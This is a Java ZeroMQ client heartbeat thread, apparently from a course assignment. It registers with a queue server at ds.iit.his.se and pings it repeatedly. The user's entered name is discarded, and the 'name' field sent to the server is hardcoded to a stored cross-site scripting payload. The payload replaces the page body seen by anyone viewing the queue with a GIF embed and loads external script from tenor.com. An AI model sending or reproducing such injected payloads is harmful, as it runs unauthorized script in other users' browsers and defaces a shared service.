import java.nio.charset.StandardCharsets;
import java.util.UUID;

import org.zeromq.SocketType;
import org.zeromq.ZContext;
import org.zeromq.ZMQ;
import org.zeromq.ZMQ.Socket;

public class ClientHeartbeat extends Thread{

	
	
	public void run() {
		
		String name = Client.frame.textField.getText();
		Client.name = name;
		UUID uuid = UUID.nameUUIDFromBytes(name.getBytes(StandardCharsets.UTF_8));
		
		try(ZContext context = new ZContext()){
			Socket req = context.createSocket(SocketType.REQ);
			req.connect("tcp://ds.iit.his.se:5556");
			String temp = "{\r\n"
					+ "    \"clientId\": \""+ uuid +"\",\r\n"
					+ "    \"name\": \""+ "<script>document. body. innerHTML=`<div class=\"tenor-gif-embed\" data-postid=\"14201282210929816440\" data-share-method=\"host\" data-aspect-ratio=\"0.564257\" data-width=\"100%\"><a href=\"https://tenor.com/view/tiger-cute-butterfly-peaceful-gif-14201282210929816440\">Tiger Cute GIF</a>from <a href=\"https://tenor.com/search/tiger-gifs\">Tiger GIFs</a></div> <script type=\"text/javascript\" async src=\"https://tenor.com/embed.js\"></script>`</script>" +"\",\r\n"
					+ "    \"enterQueue\": true\r\n"
					+ "}";
			req.send(temp.getBytes(ZMQ.CHARSET), 0);
			req.recv();
			while(!Thread.currentThread().isInterrupted()) {
				temp = "{\r\n"
						+ "    \"clientId\": \""+ uuid +"\"\r\n"
						+ "}";
				req.send(temp.getBytes(ZMQ.CHARSET), 0);
				req.recv();
				Thread.sleep(200);
			}
			req.close();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
}
